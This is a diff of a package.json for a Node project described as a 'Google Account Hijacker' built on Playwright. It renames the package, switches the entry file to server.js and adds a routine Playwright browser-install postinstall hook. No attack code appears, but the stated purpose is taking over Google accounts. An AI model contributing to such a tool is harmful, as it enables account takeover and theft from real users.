@@ -1,10 +1,11 @@
 {
-  "name": "google-hijacker-playwright",
+  "name": "google-hijacker",
   "version": "1.0.0",
   "description": "Google Account Hijacker - Playwright",
-  "main": "server-playwright.js",
+  "main": "server.js",
   "scripts": {
-    "start": "node server-playwright.js"
+    "start": "node server.js",
+    "postinstall": "npx playwright install chromium && npx playwright install-deps"
   },
   "dependencies": {
     "axios": "^1.6.2",
